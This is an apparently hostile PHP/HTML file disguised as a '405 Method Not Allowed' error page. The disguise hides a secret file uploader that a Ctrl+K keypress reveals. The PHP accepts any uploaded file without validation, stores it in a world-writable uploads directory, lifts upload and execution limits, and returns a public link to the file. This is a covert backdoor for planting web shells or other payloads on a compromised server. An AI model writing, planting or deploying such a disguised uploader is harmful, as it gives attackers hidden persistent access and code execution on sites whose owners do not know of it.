<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>405 Method Not Allowed</title>
    <style>
        body {
            background-color: #fff;
            color: #000;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .error-container { text-align: center; }
        h1 { font-size: 24px; border-bottom: 1px solid #ccc; padding-bottom: 10px; }
        p { font-size: 14px; }
        
        /* Hidden Uploader Style */
        #secret-area {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #f9f9f9;
            padding: 20px;
            border: 1px solid #333;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.5);
            z-index: 1000;
            text-align: left;
        }
    </style>
</head>
<body>

<div class="error-container">
    <h1>405 Method Not Allowed</h1>
    <p>The requested method is not allowed for the URL /index.php.</p>
</div>

<div id="secret-area">
    <h3>File Uploader</h3>
    <form action="" method="POST" enctype="multipart/form-data">
        <input type="file" name="file_to_upload">
        <input type="submit" name="upload_btn" value="Upload">
    </form>
    <div id="result">
        <?php
        if (isset($_POST['upload_btn'])) {
            // Mengatur limitasi PHP secara runtime agar bisa menerima file besar
            @ini_set('upload_max_filesize', '10G');
            @ini_set('post_max_size', '10G');
            @ini_set('max_execution_time', '0');
            @ini_set('memory_limit', '-1');

            $target_dir = "uploads/";
            if (!file_exists($target_dir)) {
                mkdir($target_dir, 0777, true);
            }

            $filename = basename($_FILES["file_to_upload"]["name"]);
            $target_file = $target_dir . $filename;

            if (move_uploaded_file($_FILES["file_to_upload"]["tmp_name"], $target_file)) {
                $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https://" : "http://";
                $actual_link = $protocol . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . "/" . $target_file;
                echo "<p style='color:green;'>Upload Success!</p>";
                echo "Link: <input type='text' value='" . htmlspecialchars($actual_link) . "' style='width:300px;' readonly>";
            } else {
                echo "<p style='color:red;'>Upload Failed.</p>";
            }
        }
        ?>
    </div>
</div>

<script>
    document.addEventListener('keydown', function(event) {
        if (event.ctrlKey && event.key === 'k') {
            event.preventDefault();
            var area = document.getElementById('secret-area');
            if (area.style.display === 'block') {
                area.style.display = 'none';
            } else {
                area.style.display = 'block';
            }
        }
    });

    // Tetap menampilkan form jika postback (setelah upload)
    if (window.location.search.includes('uploaded') || <?php echo isset($_POST['upload_btn']) ? 'true' : 'false'; ?>) {
        document.getElementById('secret-area').style.display = 'block';
    }
</script>

</body>
</html>
